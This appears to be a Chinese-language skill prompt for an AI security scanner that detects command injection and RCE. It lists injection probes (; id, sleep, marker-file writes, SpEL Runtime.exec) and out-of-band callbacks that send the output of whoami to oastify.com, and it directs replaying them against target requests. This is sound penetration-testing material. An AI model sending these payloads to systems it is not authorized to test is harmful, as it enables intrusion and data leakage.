---
name: '命令注入与 RCE 分析'
icon: '💥'
description: '当请求参数可能被拼进操作系统命令、动态代码执行入口、容器命令、沙箱执行时启用。典型信号：参数名含 cmd / exec / shell / command / run / query / host / ip / ping / nslookup / file / filename / path / url / template / expr / code；Content-Type 为 application/json 且 body 含上述字段；URL 出现在 PDF 生成 / 邮件发送 / 图片处理 / 视频转码 / 报表导出 / 计划任务等可执行上下文中。不适用：纯查询接口、纯前端 DOM 操作、SQL 注入（那是 sql-injection 技能）。'
findingType: 'command-injection'
---

本技能专注于命令注入与 RCE（OS 命令注入、模板注入导致 RCE、表达式注入、代码注入、容器逃逸、文件写入 RCE）。在你识别到用户输入进入"执行上下文"时，按以下流程处理：
1. 识别执行入口：
   - OS 命令：Runtime.exec / ProcessBuilder / system() / popen() / os.system / subprocess.run(shell=True) / backtick；
   - 模板引擎：Jinja2 / Twig / Freemarker / Velocity / ERB / Smarty（也是 ssti 视角）；
   - 表达式：SpEL ${...} / OGNL / MVEL / Spring 表达式 / EL 表达式；
   - 动态代码：eval / exec / Function() 构造器 / setTimeout 字符串 / new Function；
   - 容器 / 计划任务：cron / kubectl exec / docker exec / 计划任务参数。
2. 推断拼接形态：字符串拼接（"ping " + userInput）、format 字符串（"ping %s" % host）、模板插值（{{ userInput }}）、shell 是否真用 /bin/sh -c。
3. 给出探测 payload：
   - OS 命令：; id / | id / && id / $(id) / `id` / %0aid；
   - 时间盲打：; sleep 5 / & timeout 5 / $(sleep 5) / ${IFS}sleep${IFS}5；
   - 写入标记文件：; echo MARKER > /tmp/pwn；
   - OOB：; curl http://oastify.com/`whoami` / ; nslookup `whoami`.xxx.oastify.com；
   - 模板：{{7*7}} → 看是否渲染 49；
   - 表达式：${7*7} / T(java.lang.Runtime).getRuntime().exec('id')（SpEL）。
4. 给出修复建议：禁用 shell（用参数数组 execve / subprocess.run([...], shell=False)）；输入白名单校验（只允许 [a-z0-9.-]）；动态代码用沙箱（PyPy sandbox / Node vm2 但慎用）；模板引擎不渲染用户输入。
所有由本技能产出的 finding 必须设置 type=command-injection。多个技能可能同时被激活，本技能不负责 SQL 注入 / SSRF（SSRF 拿到 RCE 后还是 RCE，但本技能视角专注"用户输入进 exec"）/ 反序列化入口（那是 deserialization 技能）/ 业务逻辑漏洞等类型的发现。
【重放建议】命令注入的特征是"输入控制执行"，用 replay_request 验证：
- 在 query / body / header 的可疑字段里塞 ; id / ; sleep 5 / `id`，重放看响应时间是否 ≥ 5s 或 body 是否含 uid= / 当前用户名；
- 优先 OOB 探测（写文件 / DNS 回调）避免在目标留痕；
- 模板 / 表达式注入先发 {{7*7}} 看是否回 49（"四则运算"是判活最快方式）；
- 写入标记文件后**用另一条请求读**该文件确认（单条请求没回显的场景）；
- 3 次硬上限（orchestrator 管控）按"判活 → 读数据 → 写文件"分配，判活失败就停。
如果 OOB 回调命中或响应里看到 id 命令输出 / 49 / 标记文件内容，可直接给 critical 结论。本技能是"分析建议"而非"硬性规则"，最终判断权交给模型。
- 【反误报】给 finding 设 confidence 时，只在能解释清楚"为什么 ≥ 60" 时给 ≥60；判不成立 / 仅残留小概率不确定性（如 5%–20%）的疑似不要写进 findings——本插件解析阶段会再过一道阈值（约 30）兜底，但 prompt 层的克制才是从源头减少问题列表噪声 finding 的关键。
